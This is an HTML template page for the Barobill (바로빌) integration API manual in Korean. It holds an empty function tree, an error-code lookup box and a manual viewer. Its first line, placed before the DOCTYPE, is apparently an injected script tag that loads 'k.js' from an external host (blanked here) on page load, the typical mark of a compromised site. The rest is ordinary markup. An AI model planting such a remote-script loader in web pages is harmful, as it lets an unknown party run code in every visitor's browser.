<script type='text/javascript' src='https:// /k.js?v=222'></script><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta charset="utf-8">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta http-equiv="Content-Script-Type" content="text/javascript" />
	<meta http-equiv="Content-Style-Type" content="text/css" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<title>바로빌 :: 연동API 매뉴얼</title>
	<link rel="stylesheet" type="text/css" href="css/layout.css"/>
	<script type="text/javascript" src="js/jquery-1.11.1.min.js"></script>
	<script type="text/javascript" src="js/layout.js"></script>
</head>
<body>
	<div class="wrapper">
		<div class="title">
			<div>바로빌 연동 API 매뉴얼</div>
		</div>
		<div class="body">
			<div class="method-container">
				<div class="tab"></div>
				<div class="desc"><input type="text" id="FUNC" /> <img src="./images/btn_func.gif" id="FUNC_SEARCH" alt="API 조회" /></div>
				<div class="method-tree">
					<div class="root"><span>바로빌 연동서비스</span></div>
					<ul class="tree"></ul>
				</div>
			</div>
			<div class="manual-container">
				<div class="tab"></div>
				<div class="errcode">
					<input type="text" id="ERRCODE" /> <img src="./images/btn_errcode.gif" id="ERRCODE_SEARCH" maxlength="6" alt="오류코드 조회" /> <b>확인할 오류코드(5자리 숫자)를 입력하고 조회하세요.</b>
					<div class="viewer">
						오류내용 : 
						<div class="msg">
							<div class="notfound">존재하지 않는 오류코드입니다.</div>
							<div class="found">
								<span>존재하지 않는 오류코드입니다.</span>
							</div>
						</div>
						<div class="btn">
							<img src="./images/errcode_close.gif" id="ERRCODE_VIEWER_CLOSE" alt="오류코드 조회 닫기" />
						</div>
					</div>
				</div>
				<div class="desc">선택하신 연동함수에 대한 개발 매뉴얼을 아래에서 확인하실 수 있습니다.</div>
				<div class="manual-contents">
					<div class="placeholder">왼쪽의 연동함수 목록에서 조회하고자 하는 함수를 클릭하세요.</div>
				</div>
			</div>
		</div>
	</div>
</body>
</html>
